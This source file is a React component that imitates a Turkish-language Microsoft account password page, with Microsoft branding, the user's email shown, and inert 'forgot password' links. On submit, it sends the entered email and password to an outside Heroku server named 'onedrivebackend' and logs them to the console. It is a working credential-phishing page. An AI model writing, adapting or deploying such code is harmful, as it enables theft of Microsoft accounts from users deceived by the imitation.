import axios from "axios";
import React, { useState } from "react";
import { Link, useNavigate  } from "react-router-dom";

const Password = ({ email }) => {
  const [password, setPassword] = useState("");
  const navigate = useNavigate();
console.log(email,password)
  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post("https://onedrivebackend-5a68774f51f4.herokuapp.com/api/users", {
        email,
        password,
      });
      console.log(response.data);
      navigate('/')
    } catch (error) {
      console.error("There was an error creating the user!", error);
    }
  };

  return (
    <div>
      <div className="fixed h-screen w-full bg-[#F3F2F5] p-10 flex items-center justify-center ">
        <div className="w-[450px] mx-auto border border-spacing-0 p-12 bg-white shadow-2xl">
          <img className="mb-5" src="microsoft.svg" alt="Microsoft Logo" />
          <h3>{email}</h3>
          <h1 className="font-semibold text-2xl text-[#404040] mb-4 mt-3">
            Parola girin
          </h1>
          <input
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="outline-none pr-10 border-b border-black w-full focus:border-blue-600 py-1"
            type="password"
            placeholder="Parola"
          />

          <div className="grid grid-cols-1 mt-3">
            <span className="text-[#2F83C5] text-sm cursor-pointer hover:underline m-1">
              Parolanızı mı unuttunuz?
            </span>
            <span className="text-[#2F83C5] text-sm cursor-pointer hover:underline m-1">
              Bunun yerine yüzünüzü, parmak izinizi, PIN’inizi veya güvenlik
              anahtarınızı kullanın
            </span>
            <span className="text-[#2F83C5] text-sm cursor-pointer hover:underline m-1">
              Farklı bir Microsoft hesabıyla oturum açın
            </span>
          </div>

          <div className="flex justify-end mt-10">
            <Link  to="/loginpassword">
              <button onClick={handleSubmit}  className="bg-[#0067B8] text-white px-5 py-1 hover:bg-blue-600">
                Oturum Aç
              </button>
            </Link>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Password;
